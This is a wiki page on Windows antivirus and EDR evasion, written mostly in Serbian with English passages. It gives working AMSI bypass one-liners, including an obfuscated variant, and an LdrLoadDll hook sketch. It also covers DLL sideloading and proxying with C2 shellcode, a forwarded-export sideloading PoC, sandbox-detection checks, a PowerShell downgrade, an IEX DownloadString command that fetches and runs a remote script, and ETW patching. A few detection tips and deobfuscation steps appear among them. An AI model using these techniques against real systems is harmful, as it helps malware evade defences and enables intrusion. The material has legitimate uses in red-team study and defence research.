# Antivirus (AV) Zaobilaženje

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavite Defender

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat koji onemogućava Windows Defender lažirajući drugi AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **Metodologija zaobilaženja AV-a**

Trenutno AV-i koriste različite metode za proveru da li je fajl zlonameran ili ne: static detection, dynamic analysis, i za naprednije EDR-ove, behavioural analysis.

### **Statička detekcija**

Statička detekcija se postiže označavanjem poznatih zlonamernih stringova ili nizova bajtova u binarnom fajlu ili skripti, kao i izvlačenjem informacija iz samog fajla (npr. file description, company name, digital signatures, icon, checksum, itd.). To znači da korišćenje poznatih javnih alata može dovesti do lakšeg otkrivanja, jer su verovatno već analizirani i označeni kao zlonamerni. Postoji nekoliko načina da se zaobiđe ovakva detekcija:

- **Encryption**

Ako enkriptuješ binarni fajl, AV neće moći da detektuje tvoj program, ali će ti trebati neki loader koji će dekriptovati i pokrenuti program u memoriji.

- **Obfuscation**

Ponekad je dovoljno promeniti neke stringove u binarnom fajlu ili skripti da bi se zaobišao AV, ali to može biti vremenski zahtevno u zavisnosti od toga šta pokušavaš da obfuskuješ.

- **Custom tooling**

Ako razvijaš sopstvene alate, neće postojati poznati loši signaturi, ali to zahteva mnogo vremena i truda.

> [!TIP]
> Dobar način da se proveri protiv Windows Defender statičke detekcije je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On praktično deli fajl na više segmenata i potom traži od Defender-a da skenira svaki pojedinačno; na taj način može tačno da ti kaže koji su stringovi ili bajtovi označeni u tvojoj binarki.

Toplo preporučujem da pogledaš ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom izbegavanju AV-a.

### **Dinamička analiza**

Dinamička analiza je kada AV pokreće tvoju binarku u sandboxu i posmatra zlonamerne aktivnosti (npr. pokušaj dekripcije i čitanja lozinki iz browser-a, pravljenje minidump-a na LSASS, itd.). Ovaj deo može biti komplikovaniji za rad, ali evo nekoliko stvari koje možeš uraditi da izbegneš sandbokse.

- **Sleep before execution** U zavisnosti od implementacije, može biti odličan način za zaobilaženje AV-ove dinamičke analize. AV-i imaju veoma kratak vremenski okvir za skeniranje fajlova kako ne bi ometali korisnički rad, pa korišćenje dugih sleep-ova može poremetiti analizu binarki. Problem je što mnogi AV-ovi imaju sandbokse koje mogu preskočiti sleep u zavisnosti od implementacije.
- **Checking machine's resources** Obično sandboksi imaju veoma malo resursa (npr. < 2GB RAM), jer bi inače usporavali korisnikov računar. Ovde možeš biti vrlo kreativan — na primer, proverom temperature CPU-a ili brzine ventilatora, jer nije sve implementirano u sandboxu.
- **Machine-specific checks** Ako želiš da ciljaš korisnika čije je radno mesto pridruženo domenu "contoso.local", možeš proveriti domen računara i uporediti ga sa onim koji si specificirao; ako se ne poklapaju, program može izaći.

Ispostavilo se da je ime računara u Microsoft Defender sandboxu HAL9TH, pa možeš proveriti ime računara u svom malveru pre detonacije — ako se ime poklapa sa HAL9TH, znači da si unutar Defender-ovog sandboksa i možeš naterati program da izađe.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Neki drugi zaista dobri saveti od [@mgeeky](https://twitter.com/mariuszbit) za borbu protiv sandboksa

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kao što smo već rekli, **javni alati** će vremenom **biti detektovani**, pa bi trebalo da postaviš sebi pitanje:

Na primer, ako želiš da dump-uješ LSASS, **da li zaista moraš da koristiš mimikatz**? Ili bi mogao koristiti neki drugi, manje poznat projekat koji takođe dump-uje LSASS.

Pravi odgovor je verovatno potonji. Uzmimo mimikatz kao primer — verovatno je jedan od, ako ne i najčešće detektovanih komada softvera od strane AV-a i EDR-a; iako je projekat super, veoma je teško raditi sa njim radi zaobilaženja AV-a, pa jednostavno potraži alternative za ono što pokušavaš da postigneš.

> [!TIP]
> Kada modifikuješ svoje payload-e radi evazije, obavezno isključi automatic sample submission u Defender-u, i, ozbiljno, **NE UČITAVAJ NA VIRUSTOTAL** ako ti je cilj dugoročna evazija. Ako želiš da proveriš da li te payload detektuje neki konkretan AV, instaliraj ga u VM, pokušaj da isključiš automatic sample submission i testiraj tamo dok ne budeš zadovoljan rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **prioritet daj korišćenju DLL-ova za evaziju** — po mom iskustvu, DLL fajlovi su obično **značajno manje detektovani** i analizirani, pa je to jednostavan trik da se izbegne detekcija u nekim slučajevima (ako tvoj payload ima način da se pokrene kao DLL, naravno).

Kao što se vidi na ovoj slici, DLL payload iz Havoc-a ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možeš koristiti sa DLL fajlovima da budeš mnogo stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi DLL search order koji loader koristi tako što postavi i aplikaciju žrtve i zlonamerne payload-ove jedan pored drugog.

Možeš proveriti programe koji su podložni DLL Sideloading koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će ispisati listu programa podložnih DLL hijacking-u unutar "C:\Program Files\\" i DLL fajlova koje pokušavaju da učitaju.

Toplo preporučujem da **sami istražite DLL Hijackable/Sideloadable programs** — ova tehnika može biti prilično neupadljiva ako se pravilno izvede, ali ako koristite javno poznate DLL Sideloadable programs, lako možete biti otkriveni.

Samo postavljanje malicioznog DLL-a sa imenom koje program očekuje da učita neće automatski učitati vaš payload, jer program očekuje određene funkcije u tom DLL-u; da bismo to rešili, koristićemo drugu tehniku nazvanu **DLL Proxying/Forwarding**.

**DLL Proxying** preusmerava pozive koje program šalje iz proxy (i malicioznog) DLL-a na originalni DLL, čime se očuva funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Toplo preporučujem da pogledate S3cur3Th1sSh1t's twitch VOD o DLL Sideloading i takođe ippsec's video da biste detaljnije saznali više o onome što smo ovde diskutovali.

### Zloupotreba Forwarded Exports (ForwardSideLoading)

Windows PE modules mogu eksportovati funkcije koje su zapravo "forwarders": umesto da pokazuju na kod, export unos sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada caller reši export, Windows loader će:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Ključna ponašanja koja treba razumeti:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

Ovo omogućava indirektnu sideloading primitivu: pronađite potpisani DLL koji eksportuje funkciju forwardovanu ka imenu modula koji nije KnownDLL, zatim postavite taj potpisani DLL zajedno sa attacker-controlled DLL imenovanim tačno kao prosleđeni ciljni modul. Kada se prosleđeni export pozove, loader će rešiti forward i učitati vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.

Primer uočen na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, tako da se rešava kroz normalan redosled pretrage.

PoC (copy-paste):
1) Kopirajte potpisani sistemski DLL u direktorijum u koji je moguće pisati
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u isti folder. Minimalan DllMain je dovoljan za izvršenje koda; nije potrebno implementirati prosleđenu funkciju da bi se pokrenuo DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokrenite prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Posmatrano ponašanje:
- rundll32 (potpisan) učitava side-by-side `keyiso.dll` (potpisan)
- Dok rešava `KeyIsoSetAuditingInterface`, loader prati forward do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementirana, dobićete grešku "missing API" tek nakon što je `DllMain` već izvršen

Saveti za otkrivanje:
- Fokusirajte se na forwarded exports gde ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete enumerisati forwarded exports alatima kao što su:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte Windows 11 inventar forwardera da biste pretražili kandidate: https://hexacorn.com/d/apis_fwd.txt

Ideje za detekciju/odbranu:
- Nadgledajte LOLBins (e.g., rundll32.exe) koji učitavaju potpisane DLL-ove iz ne-sistemskih putanja, a zatim iz tog direktorijuma učitavaju non-KnownDLLs sa istim osnovnim imenom
- Upozorite na lance procesa/modula kao: `rundll32.exe` → ne-sistemski `keyiso.dll` → `NCRYPTPROV.dll` u putanjama zapisivim od strane korisnika
- Primijenite politike integriteta koda (WDAC/AppLocker) i onemogućite write+execute u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na prikriven način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Zaobilaženje je igra mačke i miša — ono što danas radi može biti otkriveno sutra, zato se nikada ne oslanjajte samo na jedan alat; ako je moguće, pokušajte nizati više tehnika zaobilaženja.

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku, AVs su bili u stanju da skeniraju samo **files on disk**, pa ako biste na neki način izvršili payload-e **directly in-memory**, AV nije mogao ništa da uradi da to spreči, jer nije imao dovoljnu vidljivost.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Ovo omogućava antivirus rešenjima da ispitaju ponašanje skripti tako što izlažu sadržaj skripti u obliku koji nije enkriptovan i nije obfuskovan.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju kako dodaje prefix `amsi:` i zatim putanju do izvršnog fajla iz kojeg je skripta pokrenuta, u ovom slučaju, powershell.exe.

Nismo upisali nijedan fajl na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto AMSI uglavnom radi sa statičkom detekcijom, izmena skripti koje pokušavate da učitate može biti dobar način da se izbegne detekcija.

Međutim, AMSI ima mogućnost deobfuskacije skripti čak i ako imaju više slojeva, pa obfuskacija može biti loša opcija u zavisnosti kako je izvedena. To čini zaobilaženje manje trivijalnim. Ipak, ponekad je dovoljno promeniti par imena promenljivih i biće dobro, tako da sve zavisi od stepena na koji je nešto označeno.

- **AMSI Bypass**

Pošto je AMSI implementiran tako što se DLL učitava u proces powershell (kao i cscript.exe, wscript.exe, itd.), moguće je lako manipulisati njime čak i kada se pokreće kao neprivilegovani korisnik. Zbog ovog propusta u implementaciji AMSI, istraživači su pronašli više načina da se izbegne AMSI skeniranje.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Sve što je bilo potrebno bila je jedna linija powershell koda da bi AMSI postao neupotrebljiv za trenutni powershell proces. Ta linija je, naravno, označena od strane samog AMSI, tako da je potrebna neka modifikacija da bi se ova tehnika mogla koristiti.

Evo izmenjenog AMSI bypass-a koji sam preuzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti označeno čim ova objava izađe, pa ne treba da objavljujete nikakav kod ako planirate da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/) i podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje korisnički unetog sadržaja) i prepisivanje iste instrukcijama koje vraćaju kod E_INVALIDARG; na taj način, rezultat stvarnog skeniranja će vratiti 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike za zaobilaženje AMSI pomoću powershell, pogledajte [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što je `amsi.dll` učitan u trenutni proces. Robustан, language‑agnostic bypass je postaviti user‑mode hook na `ntdll!LdrLoadDll` koji vraća grešku kada je traženi modul `amsi.dll`. Kao rezultat, AMSI se nikada ne učitava i nijedno skeniranje se ne vrši za taj proces.

Skica implementacije (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Beleške
- Radi u PowerShell, WScript/CScript i u prilagođenim loader-ima (bilo šta što bi inače učitalo AMSI).
- Koristite zajedno sa slanjem skripti preko stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli duge artefakte komandne linije.
- Viđeno u loader-ima koji se izvršavaju preko LOLBins (npr., `regsvr32` koji poziva `DllRegisterServer`).

Ovaj alat [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) takođe generiše script za zaobilaženje AMSI.

**Uklonite otkriveni potpis**

Možete koristiti alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da uklonite otkriveni AMSI potpis iz memorije trenutnog procesa. Ovaj alat radi tako što skenira memoriju trenutnog procesa tražeći AMSI potpis, a zatim ga prepisuje NOP instrukcijama, efikasno uklanjajući potpis iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Možete pronaći listu AV/EDR proizvoda koji koriste AMSI u **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI neće biti učitan, tako da možete pokrenuti svoje scripts bez skeniranja od strane AMSI. Ovo možete uraditi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcija koja vam omogućava da evidentirate sve PowerShell komande izvršene na sistemu. Ovo može biti korisno za reviziju i rešavanje problema, ali takođe može predstavljati **problem za napadače koji žele da izbegnu detekciju**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Disable PowerShell Transcription and Module Logging**: Možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) u tu svrhu.
- **Use Powershell version 2**: Ako koristite PowerShell version 2, AMSI će not biti učitan, pa možete pokretati svoje skripte bez skeniranja od strane AMSI. Možete ovo uraditi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da spawn-ujete PowerShell bez odbrana (ovo je ono što `powerpick` from Cobal Strike koristi).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork LLVM compilation suite koji omogućava povećanu bezbednost softvera kroz code obfuscation i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstrira kako koristiti `C++11/14` jezik da bi se, pri kompajliranju, generisao obfuskovani kod bez upotrebe eksternih alata i bez modifikovanja kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskovanih operacija generisanih od strane C++ template metaprogramming framework-а, što će otežati posao osobi koja želi da razbije aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator sposoban da obfuskuje različite PE fajlove uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za jezike podržane od strane LLVM koji koristi ROP (return-oriented programming). ROPfuscator obfuscira program na nivou assembly koda transformišući regularne instrukcije u ROP chains, narušavajući našu prirodnu percepciju normalnog control flow-a.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL u shellcode i zatim ih učita

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS za fajl preuzet sa Interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani pouzdanim sertifikatom za potpisivanje neće pokrenuti SmartScreen.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logovanje u Windowsu koji omogućava aplikacijama i sistemskim komponentama da **zabeleže događaje**. Međutim, može se koristiti i od strane sigurnosnih proizvoda za praćenje i otkrivanje zlonamernih aktivnosti.

Slično načinu na koji se AMSI onemogućava (bypassa), moguće je i da funkcija korisničkog prostora `EtwEventWrite` odmah vrati kontrolu bez logovanja bilo kakvih događaja. Ovo se postiže patchovanjem funkcije u memoriji da odmah vrati, efektivno onemogućavajući ETW logovanje za taj proces.

Više informacija potražite na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Učitavanje C# binarnih fajlova u memoriju je poznato već dugo i i dalje je odličan način za pokretanje vaših post-exploitation alata bez da ih otkrije AV.

Pošto će payload biti učitan direktno u memoriju bez dodirivanja diska, moraćemo se jedino pozabaviti patchovanjem AMSI-ja za ceo proces.

Većina C2 framework-a (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već omogućava izvršavanje C# assembly-ja direktno u memoriji, ali postoje različiti načini za to:

- **Fork\&Run**

To podrazumeva **pokretanje novog žrtvovanog procesa**, injektovanje vašeg post-exploitation zlonamernog koda u taj novi proces, izvršavanje koda i po završetku zatim ubijanje tog procesa. Ovo ima svoje prednosti i mane. Prednost Fork&Run metode je što se izvršavanje dešava **izvan** našeg Beacon implant procesa. To znači da ako nešto u našoj post-exploitation akciji pođe po zlu ili bude otkriveno, postoji **mnogo veća šansa** da će naš **implant preživeti.** Mana je što imate **veću šansu** da budete otkriveni od strane **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o injektovanju post-exploitation zlonamernog koda **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV, ali mana je što ako nešto pođe po zlu tokom izvršavanja vašeg payload-a, postoji **mnogo veća šansa** da ćete **izgubiti svoj beacon** jer proces može pasti.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite pročitati više o učitavanju C# assembly-ja, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Takođe možete učitati C# Assemblies **iz PowerShell-a**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati zlonamerni kod koristeći druge jezike tako što ćete kompromitovanom računaru omogućiti pristup interpreterskom okruženju instaliranom na SMB deljenju koje kontroliše napadač.

